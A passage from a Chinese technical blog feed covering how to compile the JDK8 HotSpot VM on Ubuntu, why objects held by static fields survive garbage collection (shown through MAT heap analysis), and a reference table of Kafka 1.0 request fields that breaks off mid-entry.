    <content type="html"><![CDATA[<h2 id="编译hotspot8"><a href="#编译hotspot8" class="headerlink" title="编译hotspot8"></a>编译hotspot8</h2><p>ubuntu desktop 18 全新准备与编译过程再记录下：</p><pre><code class="hljs shell"><span class="hljs-meta"> #</span><span class="bash"> 建议使用此gcc和g++版本，过高版本比如gcc7或引发编译报错</span> sudo apt-get install gcc-4.8 sudo apt-get install g++-4.8 <span class="hljs-meta"> #</span><span class="bash"> 安装相关依赖</span>sudo apt-get install  libxext-dev libxrender-dev libxtst-dev libxt-devsudo apt-get install libcups2-devsudo apt-get install libfreetype6-devsudo apt-get install libasound2-dev <span class="hljs-meta"> #</span><span class="bash">安装JDK8 并设置path  安装CDT </span> scp simon@172.16.106.122:/Users/simon/002.tools/jdk-8u211-linux-x64.tar.gz ./gedit ~/.profile export JAVA_HOME=/home/simon/002.tools/jdk1.8.0_211export  PATH="$PATH:$JAVA_HOME/bin"source ~/.profilejava -version  scp simon@172.16.106.122:/Users/simon/002.tools/eclipse-cpp-2019-06-R-linux-gtk-x86_64.tar.gz ./<span class="hljs-meta">#</span><span class="bash"> 安装版本管理工具 取代码用 切换到相应tag</span>cd /home/simon/600.self/03.code/02.cpp/hotspot-jdk8-b120/<span class="hljs-meta">#</span><span class="bash"> 这是我本地目录，对应的你自己创建就好</span>sudo apt-get install mercurial<span class="hljs-meta">#</span><span class="bash"> 获取代码 如果因为网络等问题取不下来，fanqiang吧</span>hg clone http://hg.openjdk.java.net/jdk8/jdk8<span class="hljs-meta">#</span><span class="bash"> 取好后切换到jdk8-b120分支 需要在目录 /home/simon/600.self/03.code/02.cpp/hotspot-jdk8-b120/jdk8下</span>hg up jdk8-b120<span class="hljs-meta">#</span><span class="bash"> 查看一下</span>hg identify<span class="hljs-meta">#</span><span class="bash"> 输出这个就对了  cd3825b29830 jdk8-b120</span>cd jdk8chmod +x get_source.shsh get_source.sh<span class="hljs-meta">#</span><span class="bash"> 编译3.82的make cmake代码到 ftp://ftp.gnu.org/gnu/make/make-3.82.tar.gz取 假设我放在/home/simon/002.tools/make-3.82</span>cd /home/simon/002.tools/make-3.82<span class="hljs-meta">#</span><span class="bash"> 修改下面这个文件  否则编译make报错</span>gedit glob/glob.c<span class="hljs-meta">#</span><span class="bash"> 将 211行  232行注释掉</span><span class="hljs-meta">#</span><span class="bash">// <span class="hljs-comment">#if !defined __alloca &amp;&amp; !defined __GNU_LIBRARY__</span></span><span class="hljs-meta">#</span><span class="bash">// <span class="hljs-comment">#endif</span></span><span class="hljs-meta">#</span><span class="bash"> 准备编译make3.82</span>chmod +x configure./configuremake./make --version<span class="hljs-meta">#</span><span class="bash"> 将系统的默认make链接成3.82版本</span>cd /usr/bin/sudo ln -s  /home/simon/002.tools/make-3.82/make make-3.82sudo rm makesudo ln -s make-3.82 makemake --version<span class="hljs-meta">#</span><span class="bash"> 如果看到的是3.82就可以了</span><span class="hljs-meta">#</span><span class="bash"> 确认gcc和g++是4.8版本  如果是7.x版本 或会引发如下错误：</span><span class="hljs-meta">#</span><span class="bash"> error: invalid suffix on literal; C++11 requires a space between literal and string macro [-Werror=literal-suffix]</span>cd /usr/binsudo rm gccsudo ln -s gcc-4.8 gcc<span class="hljs-meta">#</span><span class="bash"> g++同样操作即可</span>cd /usr/binsudo rm g++sudo ln -s g++-4.8 g++<span class="hljs-meta">#</span><span class="bash"> 修改hotspot/make/linux/makefiles/gcc.make 文件207 行 WARNINGS_ARE_ERRORS = -Werror 改成 WARNINGS_ARE_ERRORS = -Wno-all</span><span class="hljs-meta">#</span><span class="bash"> 编译hotspot</span><span class="hljs-meta">#</span><span class="bash"> 修改支持的os版本检查</span>cd /home/simon/600.self/03.code/02.cpp/hotspot-jdk8-b120/jdk8gedit hotspot/make/linux/Makefile<span class="hljs-meta">#</span><span class="bash"> 修改SUPPORTED_OS_VERSION =...   加上4%    不然4.x的内核不支持</span><span class="hljs-meta">#</span><span class="bash"> 如果存在build目录则删除</span>rm -rf build/chmod +x configure./configure --with-debug-level=slowdebugnohup make all &amp;tail -f nohup.out</code></pre><p>解压调试符号包并调试：  </p><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 编译到最后 Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">"main"</span> java.lang.VerifyError: class jdk.nashorn.internal.objects.ScriptFunctionImpl 这种报错就忽略好了 不影响hotspot编译</span><span class="hljs-meta">#</span><span class="bash"> 编译好了后 解压调试符号表,</span>cd /home/simon/600.self/03.code/02.cpp/hotspot-jdk8-b120/jdk8/build/linux-x86_64-normal-server-slowdebug/jdk/lib/amd64/server unzip libjvm.diz</code></pre><p>配合CDT使用，爽的飞起。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>hotspot源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>静态字段引用的对象为什么不会被GC回收</title>
    <link href="/2020/04/24/gc-static-field/"/>
    <url>/2020/04/24/gc-static-field/</url>
    
    <content type="html"><![CDATA[<h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StaticFieldClass</span> </span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Team&gt; staticField1 = <span class="hljs-keyword">new</span> ArrayList&lt;Team&gt;();<span class="hljs-keyword">static</span> &#123;staticField1.add(<span class="hljs-keyword">new</span> Team());staticField1.add(<span class="hljs-keyword">new</span> Team());&#125;&#125;</code></pre><p>staticField1 字段引用Team的对象，Team对象肯定不会被GC回收，但是这是为什么？</p><h2 id="静态字段是不是GC-ROOT，如果不是那是谁"><a href="#静态字段是不是GC-ROOT，如果不是那是谁" class="headerlink" title="静态字段是不是GC ROOT，如果不是那是谁"></a>静态字段是不是GC ROOT，如果不是那是谁</h2><p>将代码跑起来，并将堆dump下来，借助MAT分析。<br>在Histogram视图找到Team实例：<br><img src="/img/program-language-practice/gc-static-field-01.png" srcset="/img/loading.gif" alt="步骤1"></p><p>然后 右键找到的Team对象-&gt; List Objects -&gt; With incoming references<br><img src="/img/program-language-practice/gc-static-field-02.png" srcset="/img/loading.gif" alt="步骤2"></p><p>然后 右键找到的Team对象-&gt; Path TO GC Roots -&gt; exclude All Phantom…<br><img src="/img/program-language-practice/gc-static-field-03.png" srcset="/img/loading.gif" alt="步骤3"></p><p><img src="/img/program-language-practice/gc-static-field-04.png" srcset="/img/loading.gif" alt="gc root path">  </p><p>不难看出，静态字段不是GC ROOT，GC ROOT是Thread…<br>Thread持有contextClassLoader,Classloader再持有静态字段…   </p><p>同时MAT还提供了直接查看GC ROOT的功能，我们也可以顺着GC ROOT往下找到我们的对象。<br><img src="/img/program-language-practice/gc-static-field-05.png" srcset="/img/loading.gif" alt="步骤4"><br><img src="/img/program-language-practice/gc-static-field-06.png" srcset="/img/loading.gif" alt="步骤5">    </p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>gc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kafka-clients 1.0 内部请求接口文档</title>
    <link href="/2020/04/22/kafka1-0-inner-rpc-doc-request/"/>
    <url>/2020/04/22/kafka1-0-inner-rpc-doc-request/</url>
    
    <content type="html"><![CDATA[<h2 id="AddOffsetsToTxnRequest"><a href="#AddOffsetsToTxnRequest" class="headerlink" title="AddOffsetsToTxnRequest"></a>AddOffsetsToTxnRequest</h2><h3 id="version-0"><a href="#version-0" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>transactional_id</td><td>STRING</td><td>null</td><td>The transactional id corresponding to the transaction.</td></tr><tr><td>producer_id</td><td>INT64</td><td>null</td><td>Current producer id in use by the transactional id.</td></tr><tr><td>producer_epoch</td><td>INT16</td><td>null</td><td>Current epoch associated with the producer id.</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr></table>  <h2 id="AddPartitionsToTxnRequest"><a href="#AddPartitionsToTxnRequest" class="headerlink" title="AddPartitionsToTxnRequest"></a>AddPartitionsToTxnRequest</h2><h3 id="version-0-1"><a href="#version-0-1" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>transactional_id</td><td>STRING</td><td>null</td><td>The transactional id corresponding to the transaction.</td></tr><tr><td>producer_id</td><td>INT64</td><td>null</td><td>Current producer id in use by the transactional id.</td></tr><tr><td>producer_epoch</td><td>INT16</td><td>null</td><td>Current epoch associated with the producer id.</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY(INT32)})</td><td>null</td><td>The partitions to add to the transaction.</td></tr></table>  <h2 id="AlterConfigsRequest"><a href="#AlterConfigsRequest" class="headerlink" title="AlterConfigsRequest"></a>AlterConfigsRequest</h2><h3 id="version-0-2"><a href="#version-0-2" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>resources</td><td>ARRAY({resource_type:INT8,resource_name:STRING,config_entries:ARRAY({config_name:STRING,config_value:NULLABLE_STRING})})</td><td>null</td><td>An array of resources to update with the provided configs.</td></tr><tr><td>validate_only</td><td>BOOLEAN</td><td>null</td><td>null</td></tr></table>  <h2 id="AlterReplicaLogDirsRequest"><a href="#AlterReplicaLogDirsRequest" class="headerlink" title="AlterReplicaLogDirsRequest"></a>AlterReplicaLogDirsRequest</h2><h3 id="version-0-3"><a href="#version-0-3" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>log_dirs</td><td>ARRAY({log_dir:STRING,topics:ARRAY({topic:STRING,partitions:ARRAY(INT32)})})</td><td>null</td><td>null</td></tr></table>  <h2 id="ApiVersionsRequest"><a href="#ApiVersionsRequest" class="headerlink" title="ApiVersionsRequest"></a>ApiVersionsRequest</h2><h3 id="version-0-4"><a href="#version-0-4" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr></table>  <h3 id="version-1"><a href="#version-1" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr></table>  <h2 id="ControlledShutdownRequest"><a href="#ControlledShutdownRequest" class="headerlink" title="ControlledShutdownRequest"></a>ControlledShutdownRequest</h2><h3 id="version-0-5"><a href="#version-0-5" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>broker_id</td><td>INT32</td><td>null</td><td>The id of the broker for which controlled shutdown has been requested.</td></tr></table>  <h3 id="version-1-1"><a href="#version-1-1" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>broker_id</td><td>INT32</td><td>null</td><td>The id of the broker for which controlled shutdown has been requested.</td></tr></table>  <h2 id="CreateAclsRequest"><a href="#CreateAclsRequest" class="headerlink" title="CreateAclsRequest"></a>CreateAclsRequest</h2><h3 id="version-0-6"><a href="#version-0-6" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>creations</td><td>ARRAY({resource_type:INT8,resource_name:STRING,principal:STRING,host:STRING,operation:INT8,permission_type:INT8})</td><td>null</td><td>null</td></tr></table>  <h2 id="CreatePartitionsRequest"><a href="#CreatePartitionsRequest" class="headerlink" title="CreatePartitionsRequest"></a>CreatePartitionsRequest</h2><h3 id="version-0-7"><a href="#version-0-7" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topic_partitions</td><td>ARRAY({topic:STRING,new_partitions:{count:INT32,assignment:ARRAY(ARRAY(INT32))}})</td><td>null</td><td>List of topic and the corresponding new partitions.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time in ms to wait for the partitions to be created.</td></tr><tr><td>validate_only</td><td>BOOLEAN</td><td>null</td><td>If true then validate the request, but don't actually increase the number of partitions.</td></tr></table>  <h2 id="CreateTopicsRequest"><a href="#CreateTopicsRequest" class="headerlink" title="CreateTopicsRequest"></a>CreateTopicsRequest</h2><h3 id="version-0-8"><a href="#version-0-8" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>create_topic_requests</td><td>ARRAY({topic:STRING,num_partitions:INT32,replication_factor:INT16,replica_assignment:ARRAY({partition:INT32,replicas:ARRAY(INT32)}),config_entries:ARRAY({config_name:STRING,config_value:NULLABLE_STRING})})</td><td>null</td><td>An array of single topic creation requests. Can not have multiple entries for the same topic.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time in ms to wait for a topic to be completely created on the controller node. Values <= 0 will trigger topic creation and return immediately</td></tr></table>  <h3 id="version-1-2"><a href="#version-1-2" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>create_topic_requests</td><td>ARRAY({topic:STRING,num_partitions:INT32,replication_factor:INT16,replica_assignment:ARRAY({partition:INT32,replicas:ARRAY(INT32)}),config_entries:ARRAY({config_name:STRING,config_value:NULLABLE_STRING})})</td><td>null</td><td>An array of single topic creation requests. Can not have multiple entries for the same topic.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time in ms to wait for a topic to be completely created on the controller node. Values <= 0 will trigger topic creation and return immediately</td></tr><tr><td>validate_only</td><td>BOOLEAN</td><td>null</td><td>If this is true, the request will be validated, but the topic won't be created.</td></tr></table>  <h3 id="version-2"><a href="#version-2" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>create_topic_requests</td><td>ARRAY({topic:STRING,num_partitions:INT32,replication_factor:INT16,replica_assignment:ARRAY({partition:INT32,replicas:ARRAY(INT32)}),config_entries:ARRAY({config_name:STRING,config_value:NULLABLE_STRING})})</td><td>null</td><td>An array of single topic creation requests. Can not have multiple entries for the same topic.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time in ms to wait for a topic to be completely created on the controller node. Values <= 0 will trigger topic creation and return immediately</td></tr><tr><td>validate_only</td><td>BOOLEAN</td><td>null</td><td>If this is true, the request will be validated, but the topic won't be created.</td></tr></table>  <h2 id="DeleteAclsRequest"><a href="#DeleteAclsRequest" class="headerlink" title="DeleteAclsRequest"></a>DeleteAclsRequest</h2><h3 id="version-0-9"><a href="#version-0-9" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>filters</td><td>ARRAY({resource_type:INT8,resource_name:NULLABLE_STRING,principal:NULLABLE_STRING,host:NULLABLE_STRING,operation:INT8,permission_type:INT8})</td><td>null</td><td>null</td></tr></table>  <h2 id="DeleteRecordsRequest"><a href="#DeleteRecordsRequest" class="headerlink" title="DeleteRecordsRequest"></a>DeleteRecordsRequest</h2><h3 id="version-0-10"><a href="#version-0-10" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,offset:INT64})})</td><td>null</td><td>null</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The maximum time to await a response in ms.</td></tr></table>  <h2 id="DeleteTopicsRequest"><a href="#DeleteTopicsRequest" class="headerlink" title="DeleteTopicsRequest"></a>DeleteTopicsRequest</h2><h3 id="version-0-11"><a href="#version-0-11" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY(STRING)</td><td>null</td><td>An array of topics to be deleted.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time in ms to wait for a topic to be completely deleted on the controller node. Values <= 0 will trigger topic deletion and return immediately</td></tr></table>  <h3 id="version-1-3"><a href="#version-1-3" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY(STRING)</td><td>null</td><td>An array of topics to be deleted.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time in ms to wait for a topic to be completely deleted on the controller node. Values <= 0 will trigger topic deletion and return immediately</td></tr></table>  <h2 id="DescribeAclsRequest"><a href="#DescribeAclsRequest" class="headerlink" title="DescribeAclsRequest"></a>DescribeAclsRequest</h2><h3 id="version-0-12"><a href="#version-0-12" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>resource_type</td><td>INT8</td><td>null</td><td>The resource type</td></tr><tr><td>resource_name</td><td>NULLABLE_STRING</td><td>null</td><td>The resource name filter</td></tr><tr><td>principal</td><td>NULLABLE_STRING</td><td>null</td><td>The ACL principal filter</td></tr><tr><td>host</td><td>NULLABLE_STRING</td><td>null</td><td>The ACL host filter</td></tr><tr><td>operation</td><td>INT8</td><td>null</td><td>The ACL operation</td></tr><tr><td>permission_type</td><td>INT8</td><td>null</td><td>The ACL permission type</td></tr></table>  <h2 id="DescribeConfigsRequest"><a href="#DescribeConfigsRequest" class="headerlink" title="DescribeConfigsRequest"></a>DescribeConfigsRequest</h2><h3 id="version-0-13"><a href="#version-0-13" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>resources</td><td>ARRAY({resource_type:INT8,resource_name:STRING,config_names:ARRAY(STRING)})</td><td>null</td><td>An array of config resources to be returned.</td></tr></table>  <h2 id="DescribeGroupsRequest"><a href="#DescribeGroupsRequest" class="headerlink" title="DescribeGroupsRequest"></a>DescribeGroupsRequest</h2><h3 id="version-0-14"><a href="#version-0-14" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_ids</td><td>ARRAY(STRING)</td><td>null</td><td>List of groupIds to request metadata for (an empty groupId array will return empty group metadata).</td></tr></table>  <h3 id="version-1-4"><a href="#version-1-4" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_ids</td><td>ARRAY(STRING)</td><td>null</td><td>List of groupIds to request metadata for (an empty groupId array will return empty group metadata).</td></tr></table>  <h2 id="DescribeLogDirsRequest"><a href="#DescribeLogDirsRequest" class="headerlink" title="DescribeLogDirsRequest"></a>DescribeLogDirsRequest</h2><h3 id="version-0-15"><a href="#version-0-15" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY(INT32)})</td><td>null</td><td>null</td></tr></table>  <h2 id="EndTxnRequest"><a href="#EndTxnRequest" class="headerlink" title="EndTxnRequest"></a>EndTxnRequest</h2><h3 id="version-0-16"><a href="#version-0-16" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>transactional_id</td><td>STRING</td><td>null</td><td>The transactional id corresponding to the transaction.</td></tr><tr><td>producer_id</td><td>INT64</td><td>null</td><td>Current producer id in use by the transactional id.</td></tr><tr><td>producer_epoch</td><td>INT16</td><td>null</td><td>Current epoch associated with the producer id.</td></tr><tr><td>transaction_result</td><td>BOOLEAN</td><td>null</td><td>The result of the transaction (0 = ABORT, 1 = COMMIT)</td></tr></table>  <h2 id="FetchRequest"><a href="#FetchRequest" class="headerlink" title="FetchRequest"></a>FetchRequest</h2><h3 id="version-0-17"><a href="#version-0-17" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>Broker id of the follower. For normal consumers, use -1.</td></tr><tr><td>max_wait_time</td><td>INT32</td><td>null</td><td>Maximum time in ms to wait for the response.</td></tr><tr><td>min_bytes</td><td>INT32</td><td>null</td><td>Minimum bytes to accumulate in the response.</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,fetch_offset:INT64,max_bytes:INT32})})</td><td>null</td><td>Topics to fetch.</td></tr></table>  <h3 id="version-1-5"><a href="#version-1-5" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>Broker id of the follower. For normal consumers, use -1.</td></tr><tr><td>max_wait_time</td><td>INT32</td><td>null</td><td>Maximum time in ms to wait for the response.</td></tr><tr><td>min_bytes</td><td>INT32</td><td>null</td><td>Minimum bytes to accumulate in the response.</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,fetch_offset:INT64,max_bytes:INT32})})</td><td>null</td><td>Topics to fetch.</td></tr></table>  <h3 id="version-2-1"><a href="#version-2-1" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>Broker id of the follower. For normal consumers, use -1.</td></tr><tr><td>max_wait_time</td><td>INT32</td><td>null</td><td>Maximum time in ms to wait for the response.</td></tr><tr><td>min_bytes</td><td>INT32</td><td>null</td><td>Minimum bytes to accumulate in the response.</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,fetch_offset:INT64,max_bytes:INT32})})</td><td>null</td><td>Topics to fetch.</td></tr></table>  <h3 id="version-3"><a href="#version-3" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>Broker id of the follower. For normal consumers, use -1.</td></tr><tr><td>max_wait_time</td><td>INT32</td><td>null</td><td>Maximum time in ms to wait for the response.</td></tr><tr><td>min_bytes</td><td>INT32</td><td>null</td><td>Minimum bytes to accumulate in the response.</td></tr><tr><td>max_bytes</td><td>INT32</td><td>null</td><td>Maximum bytes to accumulate in the response. Note that this is not an absolute maximum, if the first message in the first non-empty partition of the fetch is larger than this value, the message will still be returned to ensure that progress can be made.</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,fetch_offset:INT64,max_bytes:INT32})})</td><td>null</td><td>Topics to fetch in the order provided.</td></tr></table>  <h3 id="version-4"><a href="#version-4" class="headerlink" title="version:4"></a>version:4</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>Broker id of the follower. For normal consumers, use -1.</td></tr><tr><td>max_wait_time</td><td>INT32</td><td>null</td><td>Maximum time in ms to wait for the response.</td></tr><tr><td>min_bytes</td><td>INT32</td><td>null</td><td>Minimum bytes to accumulate in the response.</td></tr><tr><td>max_bytes</td><td>INT32</td><td>null</td><td>Maximum bytes to accumulate in the response. Note that this is not an absolute maximum, if the first message in the first non-empty partition of the fetch is larger than this value, the message will still be returned to ensure that progress can be made.</td></tr><tr><td>isolation_level</td><td>INT8</td><td>null</td><td>This setting controls the visibility of transactional records. Using READ_UNCOMMITTED (isolation_level = 0) makes all records visible. With READ_COMMITTED (isolation_level = 1), non-transactional and COMMITTED transactional records are visible. To be more concrete, READ_COMMITTED returns all data from offsets smaller than the current LSO (last stable offset), and enables the inclusion of the list of aborted transactions in the result, which allows consumers to discard ABORTED transactional records</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,fetch_offset:INT64,max_bytes:INT32})})</td><td>null</td><td>Topics to fetch in the order provided.</td></tr></table>  <h3 id="version-5"><a href="#version-5" class="headerlink" title="version:5"></a>version:5</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>Broker id of the follower. For normal consumers, use -1.</td></tr><tr><td>max_wait_time</td><td>INT32</td><td>null</td><td>Maximum time in ms to wait for the response.</td></tr><tr><td>min_bytes</td><td>INT32</td><td>null</td><td>Minimum bytes to accumulate in the response.</td></tr><tr><td>max_bytes</td><td>INT32</td><td>null</td><td>Maximum bytes to accumulate in the response. Note that this is not an absolute maximum, if the first message in the first non-empty partition of the fetch is larger than this value, the message will still be returned to ensure that progress can be made.</td></tr><tr><td>isolation_level</td><td>INT8</td><td>null</td><td>This setting controls the visibility of transactional records. Using READ_UNCOMMITTED (isolation_level = 0) makes all records visible. With READ_COMMITTED (isolation_level = 1), non-transactional and COMMITTED transactional records are visible. To be more concrete, READ_COMMITTED returns all data from offsets smaller than the current LSO (last stable offset), and enables the inclusion of the list of aborted transactions in the result, which allows consumers to discard ABORTED transactional records</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,fetch_offset:INT64,log_start_offset:INT64,max_bytes:INT32})})</td><td>null</td><td>Topics to fetch in the order provided.</td></tr></table>  <h3 id="version-6"><a href="#version-6" class="headerlink" title="version:6"></a>version:6</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>Broker id of the follower. For normal consumers, use -1.</td></tr><tr><td>max_wait_time</td><td>INT32</td><td>null</td><td>Maximum time in ms to wait for the response.</td></tr><tr><td>min_bytes</td><td>INT32</td><td>null</td><td>Minimum bytes to accumulate in the response.</td></tr><tr><td>max_bytes</td><td>INT32</td><td>null</td><td>Maximum bytes to accumulate in the response. Note that this is not an absolute maximum, if the first message in the first non-empty partition of the fetch is larger than this value, the message will still be returned to ensure that progress can be made.</td></tr><tr><td>isolation_level</td><td>INT8</td><td>null</td><td>This setting controls the visibility of transactional records. Using READ_UNCOMMITTED (isolation_level = 0) makes all records visible. With READ_COMMITTED (isolation_level = 1), non-transactional and COMMITTED transactional records are visible. To be more concrete, READ_COMMITTED returns all data from offsets smaller than the current LSO (last stable offset), and enables the inclusion of the list of aborted transactions in the result, which allows consumers to discard ABORTED transactional records</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,fetch_offset:INT64,log_start_offset:INT64,max_bytes:INT32})})</td><td>null</td><td>Topics to fetch in the order provided.</td></tr></table>  <h2 id="FindCoordinatorRequest"><a href="#FindCoordinatorRequest" class="headerlink" title="FindCoordinatorRequest"></a>FindCoordinatorRequest</h2><h3 id="version-0-18"><a href="#version-0-18" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr></table>  <h3 id="version-1-6"><a href="#version-1-6" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>coordinator_key</td><td>STRING</td><td>null</td><td>Id to use for finding the coordinator (for groups, this is the groupId, for transactional producers, this is the transactional id)</td></tr><tr><td>coordinator_type</td><td>INT8</td><td>null</td><td>The type of coordinator to find (0 = group, 1 = transaction)</td></tr></table>  <h2 id="HeartbeatRequest"><a href="#HeartbeatRequest" class="headerlink" title="HeartbeatRequest"></a>HeartbeatRequest</h2><h3 id="version-0-19"><a href="#version-0-19" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>The generation of the group.</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr></table>  <h3 id="version-1-7"><a href="#version-1-7" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>The generation of the group.</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr></table>  <h2 id="InitProducerIdRequest"><a href="#InitProducerIdRequest" class="headerlink" title="InitProducerIdRequest"></a>InitProducerIdRequest</h2><h3 id="version-0-20"><a 